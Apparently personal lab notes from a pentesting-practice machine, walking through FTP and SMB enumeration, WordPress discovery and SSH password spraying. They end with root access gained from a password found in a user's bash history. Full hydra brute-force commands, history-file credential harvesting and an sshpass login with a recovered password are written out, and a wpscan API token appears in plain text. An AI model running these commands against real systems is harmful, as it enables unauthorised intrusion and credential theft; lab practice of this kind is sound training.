---
Status: In-progress
OS: Linux
Difficulty: Medium
tags:
  - SMB
  - History
Date: 2026-06-06T00:41:00
Owned: 2026-06-13T20:18:00
---

# Enumeration
## port scan
```sh
naabu -host 192.168.191.148 -p - | nerva -v -o allport.txt
```

result
![[Pasted image 20260606004659.png]]

port 21
ftp service try connecting with anonymous login
![[Pasted image 20260606004941.png]]

found "note"
check content
```
ftp> get note
```
![[Pasted image 20260606005038.png]]

might be useful later

now we have user:
Harry
Elly
John

ok from the note. there might be something in Elly account
let's try to bruteforce
```sh
nxc ftp 192.168.191.148 -u 'Elly' -p /usr/share/wordlists/fasttrack.txt
```
![[Pasted image 20260606013907.png]]

all in the list got "Login incorrect"

**port 80**
![[Pasted image 20260606004308.png]]
**port 139 smb**
![[Pasted image 20260606005254.png]]
![[Pasted image 20260606235654.png]]

need to specify port `--port 139` 

nothing works
not sure if the service is actually on 
![[Pasted image 20260606014213.png]]
hmm

from writeup turn out we can also run enum4linux on smb service
```
enum4linux 192.168.204.148
```

we get lots of info from here
can even enum user
![[Pasted image 20260606235815.png]]
let's save that to our kali
copy paste into user.txt
some text process to get only the name 
```sh
cat user.txt | cut -d "\\" -f2 | cut -d " " -f1 > localusers.txt
```
![[Pasted image 20260607000014.png]]



**port 3306 mysql**
![[Pasted image 20260606010600.png]]
got the version number
![[Pasted image 20260606010901.png]]

**port 12380**
![[Pasted image 20260606004727.png]]
inspecting source found interesting comment
![[Pasted image 20260606011208.png]]

let's add user name to the list
## dir enum
let' do dir enum on both site 80 and 12380
**80**
![[Pasted image 20260606010218.png]]
found nothing
let's use raft wordlist
![[Pasted image 20260606010633.png]]
nothing either

**12380**
```
feroxbuster -u http://192.168.191.148:12380 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o ferox12380.txt
```

got too many false positive
![[Pasted image 20260606005843.png]]

let's add -S 0 to filter out all size = 0
```
feroxbuster -u http://192.168.191.148:12380 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -S 0 -o ferox12380.txt
```

still can't find anything useful

dir enum with https
```
feroxbuster -u https://192.168.191.148:12380 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o ferox12380.txt
```
result
![[Pasted image 20260613000449.png]]

can't connet to any target ??
but we can see there is page accessible
![[Pasted image 20260613000547.png]]

checking robots.txt
![[Pasted image 20260613000604.png]]

/admin112233/ linked to www.xss-payload.com (probably got hacked-- redirect to suss page when visiting)

/blogblog/
![[Pasted image 20260613000727.png]]

![[Pasted image 20260613000813.png]]

wordpress huh

ok solution for direnum 
since the site use self cert that's why we can't scan in the beginning 
to solve this issue we need to add flag `-k`or `--insecure`

```sh
feroxbuster -u https://192.168.125.148:12380/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -o ferox12380https.txt -k
```
![[Pasted image 20260613154525.png]]

can view the plugins
![[Pasted image 20260613154734.png]]

we can also get this with wpscan with `-e vp`to enum vulnerable plugin
for wpscan we need to also add `--disable-tls-checks`

```sh
wpscan --rua -e vp --url https://192.168.125.148:12380/blogblog --plugins-detection aggressive --disable-tls-checks --api-token s5a5IWRehElseW6ZUdo1xutQaTuGuGa05YLK3aD3ZvY | tee wpscan.txt
```

general info
wordpress version, registration enabled
![[Pasted image 20260613162659.png]]


## tech stack
both sites use apache server 2.4.18
# Exploit
from enum4linux result we also got the shares name 
![[Pasted image 20260607000058.png]]

here we can see there is share "kathy" and "tmp"
can also use nxc with --port 139
![[Pasted image 20260607001607.png]]

let's connect using [[smbclient-ng]]
```
smbng -H 192.168.204.148 --port 139 -u '' --no-pass
```
![[Pasted image 20260607001715.png]]

there is file readable
![[Pasted image 20260607001801.png]]

tried to download file using "get file.txt" but not allowed
![[Pasted image 20260607003329.png]]

remark: if we use smbclient we can get the file somehow
check content
![[Pasted image 20260607001958.png]]

from the ftp configuration 
we know that anonymous is enable
new info is we can use local user from enum4linux to login ftp

get the file using smbclient
![[Pasted image 20260607004008.png]]

extract wordpress file
```
gunzip wordpress....
tar -xf wordpres...tar
```

now we got the wordpress directory 
let's check out for maybe cred -> nothing

# Foot hold
spraying ssh service using the localusers we got from enum4linux
```sh
hydra -L localusers.txt -P localusers.txt ssh://192.168.125.148 -v -u
```

this command `-u` tell hydra to rotate users in the list
got valid 
SHayslett:SHayslett
![[Pasted image 20260613173207.png]]

got the first flag!
![[Pasted image 20260613173314.png]]


# Privilege Escalation
run linpeas.sh
found logrotate.sh

get .bash_history of all users
```
cat */ .bash_history
```
![[Pasted image 20260613174412.png]]

from linpeas we knew that peter has root permission
`sshpass -p JZQuyIN5 ssh peter@localhost`
let's try switch to peter 

![[Pasted image 20260613174804.png]]

peter can run has sudo group

`sudo su`
paste the password again
got root

![[Pasted image 20260613174928.png]]

# Lesson Learned
sometime nxc smb with null session alone is not enough 
we could use enum4linux to get the list of share 
then we can get the content of that share with read permission

![[Pasted image 20260607000447.png]]

turned out the reason that nxc failed to enum shares in the beginning was that the default port for smb is set to 445
```
nxc smb --help
```
to be able to get the shares on this machine we need to specify port to 139

when dir enum site in this case there is a site on port 12380
don't forget to check out https 
At first, we can't find anything since, we only did dir enum with http
```sh
feroxbuster -u http://192.168.191.148:12380 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o ferox12380.txt
```

don't forget https
```
feroxbuster -u https://192.168.191.148:12380 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o ferox12380.txt
```
